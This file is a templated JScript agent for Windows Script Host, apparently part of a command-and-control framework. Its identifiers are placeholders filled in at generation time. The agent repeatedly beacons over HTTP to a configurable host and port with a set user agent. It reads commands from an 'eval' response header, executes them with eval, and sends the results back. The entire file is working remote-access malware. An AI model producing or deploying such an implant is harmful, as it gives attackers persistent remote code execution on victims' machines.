var {{variables['errors'][0]}} = {{variables['errors'][1]}};
var {{variables['file-system-object'][0]}} = {{variables['file-system-object'][1]}};
var {{variables['host'][0]}} = "{{variables['host'][1]}}";
var {{variables['port'][0]}} = "{{variables['port'][1]}}";
var {{variables['sleep'][0]}} = "{{variables['sleep'][1]}}";
var {{variables['useragent'][0]}} = "{{variables['useragent'][1]}}";
var {{variables['content-type'][0]}} = "{{variables['content-type'][1]}}";
var {{variables['x-frame-options'][0]}} = "{{variables['x-frame-options'][1]}}";
var {{variables['wscript.shell'][0]}} = {{variables['wscript.shell'][1]}};

function {{variables['post-req'][0]}}(data){
  try {
    var {{variables['winhttp.winhttprequest'][0]}} = {{variables['winhttp.winhttprequest'][1]}};
    {{variables['winhttp.winhttprequest'][0]}}.Open('Post', '{{server_context}}://' + {{variables['host'][0]}} + ':' + {{variables['port'][0]}} + '{{checkin_uri}}');
    {{variables['winhttp.winhttprequest'][0]}}.setRequestHeader("User-Agent", "{{variables['useragent'][1]}}");
    {{variables['winhttp.winhttprequest'][0]}}.setRequestHeader("X-Frame-Options", "{{variables['x-frame-options'][1]}}");
    {{variables['winhttp.winhttprequest'][0]}}.setRequestHeader("Content-Type", "{{variables['content-type'][1]}}");
    {{variables['winhttp.winhttprequest'][0]}}.setRequestHeader("Connection-ID", "{{connection_id}}");
    if(typeof(data) == 'string') {
      {{variables['winhttp.winhttprequest'][0]}}.setRequestHeader("mimetype", "text/plain");
    } else {
      {{variables['winhttp.winhttprequest'][0]}}.setRequestHeader("mimetype", "application/octet-stream");
    }
    {{variables['winhttp.winhttprequest'][0]}}.Send(data);
    {{variables['winhttp.winhttprequest'][0]}}.WaitForResponse();
    return {{variables['winhttp.winhttprequest'][0]}};
  } catch (e) {
    {{variables['errors'][0]}} = {{variables['errors'][0]}} + 1;
    if({{variables['errors'][0]}} > 50){
      WScript.Quit(1);
    }
  }
}

function kill(){
  WScript.Quit(1);
}

try {
  results = '';
  while(true){

    // If there are results display them.
    if(results != ''){
      response = {{variables['post-req'][0]}}(results);
      results = '';
    } else {
      response = {{variables['post-req'][0]}}(results);
    }

    try {
      command = response.GetResponseHeader('eval');
      try {
        results = eval(unescape(command));
      } catch (e) {
        results = 'Failed to run ' + unescape(command) + ': ' + e.message;
      }
      WScript.Sleep({{variables['sleep'][0]}});
    } catch (e) {
      WScript.Sleep({{variables['sleep'][0]}});
      continue;
    }
  }
} catch (e) {
  WScript.Quit(1);
}